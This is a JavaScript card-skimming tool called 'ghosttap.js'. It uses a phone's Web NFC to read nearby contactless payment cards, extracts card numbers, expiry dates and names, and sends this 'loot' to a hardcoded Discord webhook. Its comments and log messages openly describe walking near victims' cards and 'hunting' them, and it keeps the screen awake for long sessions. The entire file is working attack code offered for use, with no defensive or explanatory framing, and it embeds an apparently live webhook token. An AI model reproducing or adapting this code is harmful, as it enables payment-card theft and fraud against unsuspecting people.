// ghosttap.js – BULLETPROOF NOV 2025 VERSION
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/948907163756167198/aTWv2HRSlNoxxyTZIWge-IAnDm7gkZXnlXOzN7c-qnuPipBEfyBt8Z1cA_AhWBA6buEs";

let cardCount = 0;
let ndef = null;

function log(txt, color = "#0f0") {
  const l = document.getElementById("log");
  l.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${txt}</div>`;
  l.scrollTop = l.scrollHeight;
}

async function send(data) {
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` })
    });
  } catch (e) {}
}

async function startScan() {
  if (!("NDEFReader" in window)) {
    log("Device too old – no Web NFC", "#f00");
    return;
  }

  // Step 1: Request "nfc" permission (2025 requirement – user gesture needed)
  try {
    const permission = await navigator.permissions.query({ name: "nfc" });
    if (permission.state === "denied") {
      log("NFC permission denied – enable in browser settings", "#f00");
      return;
    }
    if (permission.state === "prompt") {
      // Trigger prompt on button click (user gesture)
      log("Requesting NFC access...", "#ff0");
    }
  } catch (e) {
    log("Permission query failed – trying anyway", "#ff0");
  }

  ndef = new NDEFReader();

  // Step 2: Add listeners
  ndef.addEventListener("reading", ({ message, serialNumber }) => {
    cardCount++;
    let pan = "encrypted", exp = "N/A", name = "N/A";
    for (const record of message.records) {
      const decoder = new TextDecoder();
      const text = decoder.decode(record.data);
      if (text.match(/\d{13,19}/)) pan = text.match(/\d{13,19}/)[0];
      if (text.match(/\d{4}.\d{2}/)) exp = text.match(/\d{4}.\d{2}/)[0];
      if (text.match(/[A-Z]{2,}/)) name = text;
    }
    const loot = {
      time: new Date().toISOString(),
      serial: serialNumber,
      pan, exp, name,
      raw: message.records.map(r => Array.from(new Uint8Array(r.data)))
    };
    log(`CARD ${cardCount} → ${pan.slice(-8)}`, "#ff0");
    send(loot);
  });

  ndef.addEventListener("readingerror", (e) => {
    log("NFC denied – victim blocked it", "#f00");
  });

  // Step 3: Start scan (triggers permission prompt if needed)
  try {
    await ndef.scan({ signal: AbortSignal.timeout(30000) });  // 30s timeout
    log("NFC Ready – walk near cards…", "#0f0");
  } catch (error) {
    log(`NFC failed to start: ${error.message}`, "#f00");
    if (error.name === "NotAllowedError") {
      log("Allow NFC in prompt or settings", "#ff0");
    }
  }
}

// Button click starts it (user gesture for permission)
document.addEventListener("DOMContentLoaded", () => {
  const startBtn = document.createElement("button");
  startBtn.textContent = "Start NFC Scan";
  startBtn.style.cssText = "position:fixed;top:10px;left:10px;z-index:999;background:#d82a20;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;";
  startBtn.onclick = startScan;
  document.body.appendChild(startBtn);
  log("Click 'Start NFC Scan' to begin hunting", "#ff0");
});

// Keep awake for long hunts
let wakeLock = null;
async function keepAwake() {
  if ("wakeLock" in navigator) {
    wakeLock = await navigator.wakeLock.request("screen");
  }
}
setInterval(keepAwake, 30000);
